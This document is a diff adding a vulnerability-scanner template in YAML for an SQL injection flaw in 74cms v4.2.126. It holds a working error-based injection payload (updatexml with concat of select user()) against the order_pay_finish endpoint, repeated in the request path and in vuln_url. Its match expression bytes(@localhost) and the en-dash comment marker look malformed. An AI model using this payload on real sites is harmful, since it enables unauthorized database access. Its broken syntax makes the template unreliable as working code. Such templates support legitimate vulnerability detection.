@@ -1,0 +1,12 @@
+name: 74cms v4.2.126_sqldel-qiantai2-logining
+rules:
+  - method: GET
+    path: /index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa%22 ) and updatexml(1,concat(0x7e,(select user())),0) – a
+    expression: |
+      response.body.bcontains(bytes(@localhost))
+detail:
+  author: jh
+  Affected Version: "74cms v4.2.126_sqldel-qiantai2-logining"
+  vuln_url: "index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa%22 ) and updatexml(1,concat(0x7e,(select user())),0) – a"
+  links:
+    - https://www.codercto.com/a/59112.html
